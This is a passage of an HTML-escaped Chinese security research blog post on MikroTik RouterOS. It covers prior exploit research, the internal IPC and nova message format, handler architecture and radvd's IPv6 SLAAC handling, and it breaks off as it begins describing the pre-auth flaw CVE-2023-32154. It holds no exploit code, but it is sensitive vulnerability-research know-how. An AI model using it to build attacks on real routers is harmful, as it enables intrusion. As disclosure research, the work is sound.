      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;討論 CIA 武器庫「Vault 7」外洩後所造成的大規模利用事件&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities You’re My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;釋出一套協助使用者 jailbreak RouterOS 的工具，讓使用者有能力檢查自己的機器是否在大規模利用事件中被入侵&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;如何透過串連 DNS poisoning 弱點及降版弱點拿到 shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;在 APT 的 C2 server 上發現一個利用 RouterOS 0-day 的武器，透過分析找到漏洞的成因&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;更詳細地闡述了 RouterOS 的 IPC 機制，並且釋出一套稱作 FOISted 的 jailbreak 工具協助研究員在 amd64 版本的 RouterOS 上進行近一步的研究&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;透過模糊測試在 IPC 中挖掘漏洞&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ipc-與-nova-message-回顧&quot;&gt;IPC 與 Nova Message 回顧&lt;/h2&gt;

&lt;p&gt;可以發現上述的研究大部分都離不開 RouterOS 的自製 IPC，所以我們也簡單的對其機制進行了回顧。 這裡使用一個簡單的例子對 IPC 進行說明。&lt;/p&gt;

&lt;p&gt;日常使用場景中，使用者可以透過 telnet 登入至 RouterOS，並使用 conolse 對路由器進行管理。
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;讓我們拆解整個流程中 IPC 參與的部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;當使用者欲透過 telnet 存取 RouterOS 的 console 時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process 會使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt; 去執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; 這個程式，並向使用者索取帳號及密碼。
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;當使用者送出帳號密碼之後，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process 會將帳號密碼放進 nova message 中，發送至 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process 請求驗證
&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process 完成驗證後，透過 nova message 通知驗證的結果
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;如果登入成功就會喚起 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; process，接下來使用者與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; 互動的過程都是透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process 轉發&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc-簡介&quot;&gt;IPC 簡介&lt;/h3&gt;

&lt;p&gt;上面的例子簡單地描述了 IPC 的基本概念，但兩個 process 間的溝通實際上更加複雜。首先，每個送往其他程式的 nova message 都會先透過 socket 被送往 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt;，接著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; 才根據 message 內容把 message 分派給對應的 nova binary。&lt;/p&gt;

&lt;p&gt;讓我們舉一個簡單的例子來說明：假設 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process 的 id 是 1039；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process 的 id 是 13，且 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process 中負責驗證帳號密碼的是 id 為 4 的 handler。 則在登入驗證流程中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process 首先會送一個包含帳號密碼的請求給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process，這時的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 是一個包含兩個元素的陣列：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[13, 4]&lt;/code&gt; ，表示要把 message 送給 binary id 為 13 的 process 中 id 為 4 的 handler。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; 收到 message 後，它會先移除 message 內 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 中代表目標 binary id 的 13，並在 SYS_FROM 中增加來源 binary 的 id，也就是 1039，之後把 message 傳送給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process 收到 message 後也會做類似的事情，將&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 中代表目標 handler id 的 4 移除後，接著把 nova message 送至 handler 4 進行處理，最終由 handler 4 執行驗證的邏輯。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message-簡介&quot;&gt;Nova Message 簡介&lt;/h3&gt;

&lt;p&gt;而上述 IPC 中使用的 nova message 是由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; 及相關的 function 進行初始化與設定。Nova message 實際上是由具有型別的 key-value pair 構成，且 key 只能是整數，所以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; 等 key 只是單純的 macro 罷了。而 nova message 中可以使用的型別包括 u32, u64, bool, string, bytes, IP 及 nova message （也就是可以建立巢狀的 nova message）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因為 RouterOS 已不用 JSON 來傳遞 nova message，所以我們只針對 binary 格式進行說明。在 IPC 溝通過程中，收方的 socket 首先會收到一個表達當前 nova message 長度的整數，之後接著 binary 格式的 nova message。
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nova message 的開頭是兩個 magic bytes：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;。接下來，每個 key 都使用 4 bytes 來描述；其中，前 3 bytes 用來表達 key 的 id，最後一個 byte 是 key 的型別。根據型別，會以不同解析方式將緊接在後的 bytes 取出作為 data，取完 data 之後，後面緊接著的便是下一個 key，如此循環下去。當中比較特別的是 bool 型別，因為 bool 可以僅用一個 bit 表示，nova message 便直接使用 type 的最低一位 bit 來表示 True/False，更詳細的格式可以參考 &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;：
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x3-format&quot;&gt;x3 format&lt;/h3&gt;

&lt;p&gt;為了瞭解 nova message 中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; 的 id 具體是指哪一個 nova binary，我們需要解析一種副檔名為 x3 的檔案，它是 binary 格式的 xml。在撰寫工具解析  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; 後，我們便可得知每個 id 所對應的是哪個 nova binary，例如在下圖中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/bin/log&lt;/code&gt; 的 id 就是 3。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但有些 binary 的 id 並不在這個檔案當中，是因為該 binary 可能是透過安裝 MikroTik 官方提供的 package 之後才有的功能，此時 binary 的 id 就會存在於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt; 當中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 就是一例。
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;儘管如此，依舊有些 binary id 是無法在任何 .x3 檔案中找到的，因為這類型的 process 並不是持久存在，例如：只有使用者嘗試登入時才會被喚起的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process，這類 process 就以流水號作為 id。&lt;/p&gt;

&lt;p&gt;另外，.x3 檔案也被用來記錄 nova binary 的相關設定，例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; 就在 .x3 中指定每個 URI 應該使用哪一個 servlet 來進行處理。
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;小結&quot;&gt;小結&lt;/h2&gt;

&lt;p&gt;經由回顧了過去的研究及 CVE，可以發現大多我們感興趣的漏洞都集中在過去的一段時間內，近期似乎很難在 RouterOS 的 WAN 端找到 pre-auth 的漏洞。 且雖然這期間持續有漏洞被揭露，但可以發現 MikroTik 變得越來越安全。MikroTik 上真的已經不存在 pre-auth 的漏洞了嗎？或許單純只是所有人都把什麼東西漏看了？&lt;/p&gt;

&lt;p&gt;前面提及的公開研究，可以簡單分成下面三類：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;越獄（Jailbreaking）&lt;/li&gt;
  &lt;li&gt;分析在野的 exploit&lt;/li&gt;
  &lt;li&gt;研究 IPC 中的 nova message&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而在逆向 RouterOS 上的 binary 一段時間之後，我們發現整個系統的複雜度不僅於此，但卻沒什麼人提及相關細節。因此有了以下的感想：「沒有任何理智正常的人想要花時間逆向 nova binary」。&lt;/p&gt;

&lt;p&gt;除了從 CIA 及 APT 取得的 exploit 之外，大部分在 RouterOS 上尋找漏洞的研究不外乎是 Fuzzing 網路協議、玩弄 nova message 或是針對 nova message 進行模糊測試。從成果來看，攻擊者對於 RouterOS 的理解似乎高過我們很多，我們需要探索更多關於 nova binary 的細節來彌補差距，才有機會找到我們想要找的漏洞。雖然我們並不反對 fuzzing 這個手法，但若要在這場比賽中取得優勢，我們就必須確定所有細節都被親眼看過。&lt;/p&gt;

&lt;h2 id=&quot;從何開始&quot;&gt;從何開始&lt;/h2&gt;

&lt;p&gt;我們不認為 RouterOS 已經完美無暇，而且不難發現研究員與攻擊者對於 RouterOS 的理解存在著差距。所以，要在 RouterOS 上找到 pre-auth RCE 我們還缺少什麼？&lt;/p&gt;

&lt;p&gt;首先我們想到的第一個問題是：IPC 的入口點在哪裡，它又通往哪裡？大部分透過 IPC 觸發的功能都需要進行登入，所以可以預期到：拘泥於 IPC，只會找到更多 post-auth 的弱點。且 IPC 不過只是 RouterOS 上用來實作主要功能的其中一個環節，我們更想直接、謹慎的觀察每個功能的核心程式碼。&lt;/p&gt;

&lt;p&gt;舉例來說：負責處理 DHCP 的 process 是如何從一個 DHCP 封包中擷取需要的資訊？這些資訊可能直接被存在該 process 中，或可能需要透過 IPC 送給其他 process 做進一步處理。
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-binary-的架構&quot;&gt;Nova Binary 的架構&lt;/h3&gt;

&lt;p&gt;因此我們必須先認識 nova binary 的架構，每個 nova binary 中都有一個 Looper（或其衍生類別：MultifiberLooper），Looper 是負責執行 event loop 邏輯的一個類別，每次迭代都會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; 來執行時間到了的 timer ，以及呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; 去檢查 socket 的狀態並做相對應的處理。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper 也負責自己所在的 nova binary 與 loader 之間的溝通，Looper 首先會先會針對當前 binary 與 loader 之間的 unix socket 註冊一個特別的 callback function：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;，這個函式負責把從 socket 收到的 nova message 分配給 nova binary 中對應的 handler。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;handler-類別與其衍生類&quot;&gt;Handler 類別與其衍生類&lt;/h3&gt;

&lt;p&gt;當 Looper 收到一個 nova message 時，它會將之分派給對應的 handler。例如，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; 的訊息會被 loader 分配給 binary id 為 14 的 nova binary，而 binary id 為 14 的 binary 中的 looper 收到時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 已經剩下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt;，因此 looper 會將其分配給 handler 0 進行處理。如果一開始的 nova message 中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;，則 looper 收到時 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; 為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;，這種情境將由 Looper 自行處理。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在讓我們假設，Looper 收到了一個由 handler 1 負責的 nova message，並分配給 handler 1，在收到 message 後，handler 1 會去呼叫 Handler 類別中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt;，這個函式會根據 nova message 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; 在 vtable 中尋找對應的 function 執行。&lt;/p&gt;

&lt;p&gt;除了常規的功能之外，vtable 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; 常被開發者 override 用以擴充功能，但有時開發者反而是 override &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt;，看起來是全依 MikroTik 開發者的心情而定。而 Handler 類別因為是基礎類別，所以 object 相關的指令並沒有被實作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;衍生類別&quot;&gt;衍生類別&lt;/h3&gt;

&lt;p&gt;然而 nova binary 中使用最多的並不是基本的 Handler 類別，而是其衍生類別。 衍生類別可以用來儲存多個單一型別物件，類似 C++ 的 STL 容器。&lt;/p&gt;

&lt;p&gt;舉例來說，當使用者透過 web panel 的管理介面建立一個 DHCP server 的時候，會送出一個指令為「add object」的 nova message 到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process 的 handler 0，接下來 handler 0 會產生一個 dhcp server 物件記錄相關設定，並且該物件會被保存在 handler 0 內部的一個 tree 當中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡的 handler 0 就是一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; 的 instance，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; 即是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt; 的一個衍生類別。 且由於指令是「add object」，所以觸發了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt; 這個成員函式，這個成員函式會去呼叫 handler 0 的 vtable 中位於 offset 0x7c 位置所指向的一個 function，這個 function 實際上就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; 中包含的物件的建構式，例如，若開發者在宣告 handler 0 時，其類型為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt; ，則 offset 0x7c 的位置所指向的 function 就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; 的建構式。&lt;/p&gt;

&lt;p&gt;每個衍生類別儲存內部物件建構式的 function 在 vtable 上的 offset 都不相同，想要找到衍生類別中物件的建構子，可以透過逆向它們個別的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; 來找到。&lt;/p&gt;

&lt;h3 id=&quot;ipc和-ipc-以外的&quot;&gt;IPC，和 IPC 以外的&lt;/h3&gt;

&lt;p&gt;儘管 IPC 似乎無處不在，但其實 RouterOS 中有許多功能並不以 IPC 實現。以實作在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; 程式中的兩個 layer 2 的發現協議：CDP、LLDP 為例：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;在開啟這兩個服務時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; 中的 handler 0 會負責去呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; 來開啟 CDP 及 LLDP 使用的 socket 並且註冊分別對應的 callback function&lt;/li&gt;
  &lt;li&gt;在 Looper 的每次迭代中，程式會透過 poll 來檢查 CDP 及 LLDP socket 是否有收到封包&lt;/li&gt;
  &lt;li&gt;如果發現有收到封包就會呼叫對應的 callback function 去進行處理&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CDP 的 callback 做的事情也非常簡單：確定收到封包的 interface 是允許存取的，如果正確，就解析封包並直接把資訊直接存入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; 接著就直接結束，過程中並不使用 nova message。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在此類情境中，IPC 除了用來開啟 CDP 或 LLDP 服務之外（預設開啟），完全無法觸發 CDP 或是 LLDP 的任何功能，因此以往專注於 IPC 的研究就很有可能沒有檢測到這種實作方式的程式邏輯。&lt;/p&gt;

&lt;h2 id=&quot;pre-auth-rce-的故事&quot;&gt;Pre-Auth RCE 的故事&lt;/h2&gt;

&lt;p&gt;對於 RouterOS 的理解，也伴隨著一次驚喜的意外帶領我們找到深藏已久的漏洞。&lt;/p&gt;

&lt;p&gt;賽前某一天，我們照常為了在 RouterOS 上進行逆向及除錯而插拔網路線時，發現 log file 紀錄到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 這隻程式已經 crash 了好幾次！所以我們嘗試插拔網路線來手動復現 crash 的發生，搭配 debugger 使用就能定位到出問題的地方，但經過了上千次的插拔，我們還是無法確定 crash 產生的條件，只能任憑 crash 隨機的發生。&lt;/p&gt;

&lt;p&gt;經過一段時間的掙扎後，我們停止透過這種盲目的嘗試來定位漏洞，轉而利用靜態逆向分析 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 來尋找 crash 產生的位置，雖然最後依舊沒找到造成 crash 的根因，但受益於我們對於 nova binary 的理解，我們在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中找到了另外一個可以利用的漏洞。&lt;/p&gt;

&lt;p&gt;在介紹這個漏洞之前，必須得先介紹一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;  process 究竟是負責什麼功能的程式。&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;一言以蔽之，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 是一個負責處理 IPv6 的 SLAAC 的服務。&lt;/p&gt;

&lt;p&gt;在 SLAAC 環境中，假設一台電腦想要取得一個 IPv6 的地址上網，他首先會向所有 router 廣播一個 RS（Router Solicitation）的請求。 在 Router 收到 RS 之後，就會透過 RA（Router Advertisement）將 network prefix 廣播出去；收到 RA 的電腦便可以拿 network prefix 以及 EUI-64 來自行決定自己用來連網的 IPv6 為何。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;若 ISP 或是網管，想把一個網段分配給用戶，讓用戶可自行分配地址給用戶管理的機器，在只使用 SLAAC 而不輔以 DHCP 時，如何分配一個網段給使用者？因為 SLAAC 並沒有辦法直接委派，所以通常會是這麼運作的：&lt;/p&gt;

&lt;p&gt;假設有一個 upstream router：Router A，它屬於 ISP 或網管、還有一台用戶自行管理的 Router B、一台用戶管理的電腦。ISP 或網管會預先透過 email 通知用戶一個分配給用戶使用的 /48 network preifx，這裡假設是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt;。用戶可以將之設定在 Router B 上，則當電腦向 Router B 發送 RS 時，Router B 就會把這個 prefix 放入 RA 中回傳，而這個 prefix 稱作 routed prefix。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同時為了讓使用者的 Router B 有辦法與 Router A 溝通，它也需要一個自己的 IPv6 地址，這時 Router B 從 Router A 拿到的 network prefix 就稱作 link prefix。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;radvd-的執行流程&quot;&gt;radvd 的執行流程&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process 被啟動時，會透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; 來開啟 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 使用的 socket 並且註冊對應的 callback function
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; 的每次迭代中會透過 poll 檢查 socket 是否有收到封包
&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;如果發現有收到封包就會呼叫對應的 callback function 去進行處理
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 的 callback 中，它首先檢查封包是否是合法的 RA 或 RS，是 RA 就把資訊存起來；是 RS 就開始往 LAN 廣播 RA。&lt;/p&gt;

&lt;p&gt;而總共有三種情況 RouterOS 會往 LAN 廣播 prefix：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;從 LAN 收到 RS 封包&lt;/li&gt;
  &lt;li&gt;從 WAN 收到 RA 封包&lt;/li&gt;
  &lt;li&gt;定時在 LAN 廣播 RA 封包（預設隨機在 200~600 秒之後廣播一次）&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;不過在 callback 中我們沒有馬上透過靜態分析找到 case 2 發送 RA 的地方，當時我們還不確定具體原因。後來發現這部分的行為與 RouterOS IPC 中的訂閱機制有關，我們將會在後面的章節進行解釋，這同時也與我們發現的 race condition 相關。不過另外兩個情況我們到是可以直接透過靜態分析找到。&lt;/p&gt;

&lt;p&gt;在 case 1 中，當從 LAN 收到 RS 時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 會呼叫 sendRA 來廣播 RA 封包：
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 case 2 中，handler 1 在初始化後便會去註冊一個 timer，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;：
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; 被用來在每隔一段時間去呼叫 sendRA 來廣播封包：
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;可以發現共同的函式就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;，在深入分析 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; 之後，我們發現 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 在處理 DNS advisory 的地方存在弱點。&lt;/p&gt;

